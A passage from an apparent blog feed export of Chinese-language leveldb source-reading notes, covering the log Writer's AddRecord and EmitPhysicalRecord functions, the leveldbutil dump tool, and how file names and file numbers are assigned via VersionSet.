<span class="comment">// Create a writer that will append data to "*dest".</span></span><br><span class="line">  <span class="comment">// "*dest" must be initially empty.</span></span><br><span class="line">  <span class="comment">// "*dest" must remain live while this Writer is in use.</span></span><br><span class="line">  <span class="function"><span class="keyword">explicit</span> <span class="title">Writer</span><span class="params">(WritableFile* dest)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Create a writer that will append data to "*dest".</span></span><br><span class="line">  <span class="comment">// "*dest" must have initial length "dest_length".</span></span><br><span class="line">  <span class="comment">// "*dest" must remain live while this Writer is in use.</span></span><br><span class="line">  Writer(WritableFile* dest, <span class="keyword">uint64_t</span> dest_length);</span><br><span class="line"></span><br><span class="line">  Writer(<span class="keyword">const</span> Writer&amp;) = <span class="keyword">delete</span>;</span><br><span class="line">  Writer&amp; <span class="keyword">operator</span>=(<span class="keyword">const</span> Writer&amp;) = <span class="keyword">delete</span>;</span><br><span class="line"></span><br><span class="line">  ~Writer();</span><br><span class="line"></span><br><span class="line">  <span class="function">Status <span class="title">AddRecord</span><span class="params">(<span class="keyword">const</span> Slice&amp; slice)</span></span>;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">private</span>:</span><br><span class="line">  <span class="function">Status <span class="title">EmitPhysicalRecord</span><span class="params">(RecordType type, <span class="keyword">const</span> <span class="keyword">char</span>* ptr, <span class="keyword">size_t</span> length)</span></span>;</span><br><span class="line"></span><br><span class="line">  WritableFile* dest_;</span><br><span class="line">  <span class="keyword">int</span> block_offset_;  <span class="comment">// Curr </span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 预计算的crc</span></span><br><span class="line">  <span class="comment">// crc32c values for all supported record types.  These are</span></span><br><span class="line">  <span class="comment">// pre-computed to reduce the overhead of computing the crc of the</span></span><br><span class="line">  <span class="comment">// record type stored in the header.</span></span><br><span class="line">  <span class="keyword">uint32_t</span> type_crc_[kMaxRecordType + <span class="number">1</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">&#125;  <span class="comment">// namespace log</span></span><br><span class="line">&#125;  <span class="comment">// namespace leveldb</span></span><br></pre></td></tr></table></figure><h4 id="核心-AddRecord-函数"><a href="#核心-AddRecord-函数" class="headerlink" title="核心-AddRecord 函数"></a>核心-AddRecord 函数</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Status <span class="title">Writer::AddRecord</span><span class="params">(<span class="keyword">const</span> Slice&amp; slice)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span>* ptr = slice.data();</span><br><span class="line">  <span class="keyword">size_t</span> left = slice.<span class="built_in">size</span>();<span class="comment">// left表示剩余多少size未写</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Fragment the record if necessary and emit it.  Note that if slice</span></span><br><span class="line">  <span class="comment">// is empty, we still want to iterate once to emit a single</span></span><br><span class="line">  <span class="comment">// zero-length record</span></span><br><span class="line">  Status s;</span><br><span class="line">  <span class="keyword">bool</span> <span class="built_in">begin</span> = <span class="literal">true</span>;</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">int</span> leftover = kBlockSize - block_offset_;<span class="comment">// 当前32kb的块的剩余量</span></span><br><span class="line">    assert(leftover &gt;= <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (leftover &lt; kHeaderSize) &#123;<span class="comment">// 剩余量 &lt; 一个record的header size</span></span><br><span class="line">      <span class="comment">// Switch to a new block</span></span><br><span class="line">      <span class="keyword">if</span> (leftover &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// Fill the trailer (literal below relies on kHeaderSize being 7)</span></span><br><span class="line">        <span class="keyword">static_assert</span>(kHeaderSize == <span class="number">7</span>, <span class="string">""</span>);</span><br><span class="line">        dest_-&gt;Append(Slice(<span class="string">"\x00\x00\x00\x00\x00\x00"</span>, leftover));<span class="comment">// 填充本块最后的空间</span></span><br><span class="line">      &#125;</span><br><span class="line">      block_offset_ = <span class="number">0</span>; <span class="comment">// 更换新块</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Invariant: we never leave &lt; kHeaderSize bytes in a block.</span></span><br><span class="line">    assert(kBlockSize - block_offset_ - kHeaderSize &gt;= <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">size_t</span> avail = kBlockSize - block_offset_ - kHeaderSize;<span class="comment">// 剩余可用给数据的空间</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">size_t</span> fragment_length = (left &lt; avail) ? left : avail;</span><br><span class="line"></span><br><span class="line">    RecordType type;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">bool</span> <span class="built_in">end</span> = (left == fragment_length);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">begin</span> &amp;&amp; <span class="built_in">end</span>) &#123;<span class="comment">// 开始和结束都在本块，整条record都可放置</span></span><br><span class="line">      type = kFullType;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">begin</span>) &#123;<span class="comment">// 只有开始在，结束不在，说明是第一条</span></span><br><span class="line">      type = kFirstType;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">end</span>) &#123;<span class="comment">// 结束在，开始不在，说明是最后一条</span></span><br><span class="line">      type = kLastType;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;<span class="comment">// 其余就是中间条目</span></span><br><span class="line">      type = kMiddleType;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// 将本条Record写入到物理设备上</span></span><br><span class="line">    s = EmitPhysicalRecord(type, ptr, fragment_length);</span><br><span class="line">    ptr += fragment_length;</span><br><span class="line">    left -= fragment_length;</span><br><span class="line">    <span class="built_in">begin</span> = <span class="literal">false</span>;</span><br><span class="line">  &#125; <span class="keyword">while</span> (s.ok() &amp;&amp; left &gt; <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>基本流程如下：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/AddRecord%E5%87%BD%E6%95%B0%E6%B5%81%E7%A8%8B%E5%9B%BE-1600848090666.jpg" alt=""></p><h4 id="EmitPhysicalRecord函数"><a href="#EmitPhysicalRecord函数" class="headerlink" title="EmitPhysicalRecord函数"></a>EmitPhysicalRecord函数</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Status <span class="title">Writer::EmitPhysicalRecord</span><span class="params">(RecordType t, <span class="keyword">const</span> <span class="keyword">char</span>* ptr,</span></span></span><br><span class="line"><span class="function"><span class="params">                                  <span class="keyword">size_t</span> length)</span> </span>&#123;</span><br><span class="line">  assert(length &lt;= <span class="number">0xffff</span>);  <span class="comment">// Must fit in two bytes 一个块最多写32kb，即2^15，至少需要15个bit，所以需要2个字节（解释了为什么要用0xffff)</span></span><br><span class="line">  assert(block_offset_ + kHeaderSize + length &lt;= kBlockSize);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Format the header</span></span><br><span class="line">  <span class="keyword">char</span> buf[kHeaderSize];</span><br><span class="line">   <span class="comment">// 初始化header， 4-5为数据的length， 6 为类型</span></span><br><span class="line">  buf[<span class="number">4</span>] = <span class="keyword">static_cast</span>&lt;<span class="keyword">char</span>&gt;(length &amp; <span class="number">0xff</span>);</span><br><span class="line">  buf[<span class="number">5</span>] = <span class="keyword">static_cast</span>&lt;<span class="keyword">char</span>&gt;(length &gt;&gt; <span class="number">8</span>);</span><br><span class="line">  buf[<span class="number">6</span>] = <span class="keyword">static_cast</span>&lt;<span class="keyword">char</span>&gt;(t);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Compute the crc of the record type and the payload.</span></span><br><span class="line">  <span class="keyword">uint32_t</span> crc = crc32c::Extend(type_crc_[t], ptr, length);</span><br><span class="line">  crc = crc32c::Mask(crc);  <span class="comment">// Adjust for storage</span></span><br><span class="line">    <span class="comment">// crc校验</span></span><br><span class="line">  EncodeFixed32(buf, crc);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Write the header and the payload</span></span><br><span class="line">  Status s = dest_-&gt;Append(Slice(buf, kHeaderSize));<span class="comment">// 加入heder</span></span><br><span class="line">  <span class="keyword">if</span> (s.ok()) &#123;</span><br><span class="line">    s = dest_-&gt;Append(Slice(ptr, length));<span class="comment">// 加如实际数据</span></span><br><span class="line">    <span class="keyword">if</span> (s.ok()) &#123;</span><br><span class="line">      s = dest_-&gt;Flush();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  block_offset_ += kHeaderSize + length;</span><br><span class="line">  <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数相对简单：</p><ol><li>检查写入数据的length是否符合条件。满足在2个字节以内。</li><li>填充record的元数据， length + type + crc校验码</li><li>写入到dest_中。</li></ol><h2 id="3-总结"><a href="#3-总结" class="headerlink" title="3. 总结"></a>3. 总结</h2><p>本文介绍了leveldb中用来保证持久性的log文件，重点介绍了它的逻辑布局和物理布局，同时介绍了一次log写入操作是如何执行的。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;log文件是用来保证写入的持久性的。当用户向系统发出write请求，首先就会将数据写入一份到log文件中，然后再写入到memtable，这是为了防止系统crash而出现数据loss。&lt;/p&gt;
    
    </summary>
    
    
      <category term="leveldb" scheme="https://www.ravenxrz.ink/categories/leveldb/"/>
    
    
  </entry>
  
  <entry>
    <title>leveldb源码阅读记录-leveldbutil工具</title>
    <link href="https://www.ravenxrz.ink/archives/2938ff32.html"/>
    <id>https://www.ravenxrz.ink/archives/2938ff32.html</id>
    <published>2020-10-12T01:52:34.000Z</published>
    <updated>2020-10-12T01:59:20.333Z</updated>
    
    <content type="html"><![CDATA[<p>从本文之后，我们将正式分析leveldb内部组件，如memtable,sstable, log, manifest等。</p><a id="more"></a><p> 如果你已经搭建了leveldb的源码debug环境并做过简单测试，你会发现leveldb中存在以下几类文件：</p><ul><li>sstable文件，sst或ldb结尾</li><li>log文件，保证写入的持久性</li><li>MANIFEST, 记录每次修改操作的增量，记录sstable的元数据</li><li>CURRENT， 指向当前该使用哪个MANIFEST</li><li>LOCK 锁相关</li><li>LOG.old 日志</li></ul><p>一般情况下，除了CURRENT和LOG.old文件可以双击查看，其它文件都是没办法查看的，因为它们都不是txt文件，而是经过leveldb按照自身设计而存储的。但是有没有办法查看这些文件的内容呢？有，leveldb为我们提供了一个工具—<strong>leveldb/db/leveldbutil.cc</strong></p><p>我们将它编译成可执行文件后，执行 ./levelutil dump [要查看的文件] 即可打印相关文件的信息，如，我要查看log文件：</p><p><img data-src="https://pic.downk.cc/item/5f81b4da1cd1bbb86b526c02.jpg" alt=""></p><p>知道了这个工具，在后续查看文件布局时就会比较方便了。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这篇文章介绍了查看 log、sstable、manifest等文件的工具–leveldbutil. 文本是”前置知识“的最后一篇，从下文开始，我们将分析leveldb中log文件。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;从本文之后，我们将正式分析leveldb内部组件，如memtable,sstable, log, manifest等。&lt;/p&gt;
    
    </summary>
    
    
      <category term="leveldb" scheme="https://www.ravenxrz.ink/categories/leveldb/"/>
    
    
  </entry>
  
  <entry>
    <title>leveldb源码阅读记录-文件命名规则</title>
    <link href="https://www.ravenxrz.ink/archives/f38b067b.html"/>
    <id>https://www.ravenxrz.ink/archives/f38b067b.html</id>
    <published>2020-10-12T01:50:34.000Z</published>
    <updated>2020-10-12T03:01:46.348Z</updated>
    
    <content type="html"><![CDATA[<p>本片文章我们说一说leveldb中的文件命名规则。</p><blockquote><p>这篇文章虽然放在前置知识，但是内部原理牵涉到leveldb中的Version相关类，所以看不懂没关系，只用知道一个结论：leveldb的所有带编号的文件共用一套编号系统，也就是说任何带编号的文件不可能有重复的编号。如不会出现 000001.ldb和000001.log文件这种情况。</p></blockquote><a id="more"></a><p>运行leveldb程序一段时间后，我们会发现在系统给中，存在很多由数字编号的文件：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20201009111936923.png" alt="image-20201009111936923"></p><p>这篇文章从整体上谈一谈leveldb的文件命令和文件编号的来源。</p><h2 id="1-文件命名"><a href="#1-文件命名" class="headerlink" title="1. 文件命名"></a>1. 文件命名</h2><p>在leveldb中和文件命名相关的代码在：</p><ul><li>leveldb/db/filename.cc</li><li>leveldb/db/filename.h</li></ul><p>其核心为MakeFileName函数：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="built_in">std</span>::<span class="built_in">string</span> <span class="title">MakeFileName</span><span class="params">(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; dbname, <span class="keyword">uint64_t</span> number,</span></span></span><br><span class="line"><span class="function"><span class="params">                                <span class="keyword">const</span> <span class="keyword">char</span>* suffix)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">snprintf</span>(buf, <span class="keyword">sizeof</span>(buf), <span class="string">"/%06llu.%s"</span>,</span><br><span class="line">                <span class="keyword">static_cast</span>&lt;<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>&gt;(number), suffix);</span><br><span class="line">  <span class="keyword">return</span> dbname + buf;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到文件名时由 dbname + 6位number + 后缀组成的。 比如dbname = testdb, 则一个sstable的文件名可以为： testdb/000132.ldb. (ldb和sst都是sstable的有效后缀)</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="built_in">std</span>::<span class="built_in">string</span> <span class="title">TableFileName</span><span class="params">(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; dbname, <span class="keyword">uint64_t</span> number)</span> </span>&#123;</span><br><span class="line">  assert(number &gt; <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> MakeFileName(dbname, number, <span class="string">"ldb"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="built_in">std</span>::<span class="built_in">string</span> <span class="title">SSTTableFileName</span><span class="params">(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; dbname, <span class="keyword">uint64_t</span> number)</span> </span>&#123;</span><br><span class="line">  assert(number &gt; <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> MakeFileName(dbname, number, <span class="string">"sst"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>另外，manifest文件没有调用MakeFileName，而是自己单独的函数:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="built_in">std</span>::<span class="built_in">string</span> <span class="title">DescriptorFileName</span><span class="params">(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; dbname, <span class="keyword">uint64_t</span> number)</span> </span>&#123;</span><br><span class="line">  assert(number &gt; <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">snprintf</span>(buf, <span class="keyword">sizeof</span>(buf), <span class="string">"/MANIFEST-%06llu"</span>,</span><br><span class="line">                <span class="keyword">static_cast</span>&lt;<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>&gt;(number));</span><br><span class="line">  <span class="keyword">return</span> dbname + buf;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-文件编号"><a href="#2-文件编号" class="headerlink" title="2. 文件编号"></a>2. 文件编号</h2><h3 id="1-sstable-log和manifest的number"><a href="#1-sstable-log和manifest的number" class="headerlink" title="1. sstable, log和manifest的number"></a>1. sstable, log和manifest的number</h3><p>dbname和后缀容易理解。那number是在哪儿来的？</p><p>实际上在leveldb中所有和编号有关的文件名的编码都有versonset来维护：</p><p>如log file的number:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uint64_t</span> new_log_number = impl-&gt;versions_-&gt;NewFileNumber();</span><br><span class="line">WritableFile* lfile;</span><br><span class="line">s = options.env-&gt;NewWritableFile(LogFileName(dbname, new_log_number),</span><br><span class="line">                                 &amp;lfile);</span><br></pre></td></tr></table></figure><p>又如sstable的number:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">file_number = versions_-&gt;NewFileNumber();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Make the output file</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> fname = TableFileName(dbname_, file_number);</span><br></pre></td></tr></table></figure><p>看看NewFileNumber：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">NewFileNumber</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> next_file_number_++; &#125;</span><br></pre></td></tr></table></figure><p>所以log和sst文件的编号都是由versionset中的next_file_number_来维护的。注意在versionset的构造函数中，next_file_number被初始化为2:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">VersionSet::VersionSet(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; dbname, <span class="keyword">const</span> Options* options,</span><br><span class="line">                       TableCache* table_cache,</span><br><span class="line">                       <span class="keyword">const</span> InternalKeyComparator* cmp)</span><br><span class="line">    : env_(options-&gt;env),</span><br><span class="line">      dbname_(dbname),</span><br><span class="line">      options_(options),</span><br><span class="line">      table_cache_(table_cache),</span><br><span class="line">      icmp_(*cmp),</span><br><span class="line">      next_file_number_(<span class="number">2</span>),<span class="comment">// !! 这里被初始化为2的</span></span><br><span class="line">      manifest_file_number_(<span class="number">0</span>),  <span class="comment">// Filled by Recover()</span></span><br><span class="line">      last_sequence_(<span class="number">0</span>),</span><br><span class="line">      log_number_(<span class="number">0</span>),</span><br><span class="line">      prev_log_number_(<span class="number">0</span>),</span><br><span class="line">      descriptor_file_(<span class="literal">nullptr</span>),</span><br><span class="line">      descriptor_log_(<span class="literal">nullptr</span>),</span><br><span class="line">      dummy_versions_(<span class="keyword">this</span>),</span><br><span class="line">      current_(<span class="literal">nullptr</span>) &#123;</span><br><span class="line">  AppendVersion(<span class="keyword">new</span> Version(<span class="keyword">this</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="文件编号1在哪儿？"><a href="#文件编号1在哪儿？" class="headerlink" title="文件编号1在哪儿？"></a>文件编号1在哪儿？</h4><p>那谁在用1呢？<code>manifest_file_number_</code>在用。注意到在<code>versionset</code>的构造函数中<code>manifest_file_number_</code>初始化为0. 如果系统是首次使用，则会在NewDB中重新对<code>manifest_file_number_</code>赋值：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Status <span class="title">DBImpl::NewDB</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  VersionEdit new_db;</span><br><span class="line">  new_db.SetComparatorName(user_comparator()-&gt;Name());</span><br><span class="line">  new_db.SetLogNumber(<span class="number">0</span>);</span><br><span class="line">  new_db.SetNextFile(<span class="number">2</span>);<span class="comment">// !! 记住这里的next file number = 2</span></span><br><span class="line">  new_db.SetLastSequence(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// !! 这里设置了manifest的number = 1</span></span><br><span class="line">  <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> manifest = DescriptorFileName(dbname_, <span class="number">1</span>);</span><br><span class="line">...</span><br><span class="line">    </span><br><span class="line">  <span class="keyword">if</span> (s.ok()) &#123;</span><br><span class="line">      <span class="comment">// 设置CURRENT 指向</span></span><br><span class="line">    <span class="comment">// Make "CURRENT" file that points to the new manifest file.</span></span><br><span class="line">    s = SetCurrentFile(env_, dbname_, <span class="number">1</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    env_-&gt;RemoveFile(manifest);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不过一般来说，除非你修改了options，否则你在运行leveldb时，看到的最小的manifest文件应该是，MANIFEST-000002. 这是为什么？这是因为在DBImpl::Open函数中调用NewDB函数后，紧接着调用了Recover.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Status <span class="title">VersionSet::Recover</span><span class="params">(<span class="keyword">bool</span>* save_manifest)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 省略掉的... 中做工作就是中 CURRENT 所指向的manifest文件读取内容， 先前在NewDB中CURRENT指向 manifest000001</span></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">  &#123;</span><br><span class="line">    ...</span><br><span class="line">      <span class="keyword">if</span> (edit.has_next_file_number_) &#123;</span><br><span class="line">        next_file = edit.next_file_number_;<span class="comment">// 此时next_file = 2, 因为在NewDB中 next_file_number_ 被设置为2</span></span><br><span class="line">        have_next_file = <span class="literal">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (edit.has_last_sequence_) &#123;</span><br><span class="line">        last_sequence = edit.last_sequence_;</span><br><span class="line">        have_last_sequence = <span class="literal">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">delete</span> file;</span><br><span class="line">  file = <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">  <span class="keyword">if</span> (s.ok()) &#123;</span><br><span class="line">    Version* v = <span class="keyword">new</span> Version(<span class="keyword">this</span>);</span><br><span class="line">    builder.SaveTo(v);</span><br><span class="line">    <span class="comment">// Install recovered version</span></span><br><span class="line">    Finalize(v);</span><br><span class="line">    AppendVersion(v);</span><br><span class="line">    manifest_file_number_ = next_file;<span class="comment">// ！！ 这里manifest_file_number_ = 2</span></span><br><span class="line"> ...</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从这里就解释了 manifest_file_number_ = 2是如何来的， 那manifest_file_number_ = 1是如何消失的？在DBImpl::Open的下半部分：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (s.ok()) &#123;</span><br><span class="line">  impl-&gt;RemoveObsoleteFiles();<span class="comment">// 其中移除了manifest_file_number = 1时的文件</span></span><br><span class="line">  impl-&gt;MaybeScheduleCompaction();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不过要意识到，这只是系统第一次使用启动时manifest_file_number的指定过程。 在后序的使用过程中，manifest_file_number的初始化是从<code>VersionSet::Recover</code>中开始，这其中 manifest_file_number仍然由next_file_number_指定，另外还要考虑是否Reuse旧manifest文件，如果复用，manifest_file_number将等于旧manifest的number。</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p><strong>总结起来一句话，sstable, log, manifest的编号都是由versoinset的next_file_number_来指定。</strong></p><h3 id="2-VersoinSet中的LogNumber和PrevLogNumber"><a href="#2-VersoinSet中的LogNumber和PrevLogNumber" class="headerlink" title="2. VersoinSet中的LogNumber和PrevLogNumber"></a>2. VersoinSet中的LogNumber和PrevLogNumber</h3><p>PrevLogNumber已不再使用。</p><p>LogNumber存放的是当前系统有效的log file 的number。用于写log、recover系统时判定是否有newer log没有转化为sstable等。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本片文章我们说一说leveldb中的文件命名规则。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;这篇文章虽然放在前置知识，但是内部原理牵涉到leveldb中的Version相关类，所以看不懂没关系，只用知道一个结论：leveldb的所有带编号的文件共用一套编号系统，也就是说任何带编号的文件不可能有重复的编号。如不会出现 000001.ldb和000001.log文件这种情况。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="leveldb" scheme="https://www.ravenxrz.ink/categories/leveldb/"/>
    
    
  </entry>
  
  <entry>
    <title>leveldb源码阅读记录-编码</title>
    <link href="https://www.ravenxrz.ink/archives/8f115521.html"/>
    <id>https://www.ravenxrz.ink/archives/8f115521.html</id>
    <published>2020-10-12T01:46:54.000Z</published>
    <updated>2020-10-12T01:59:20.336Z</updated>
    
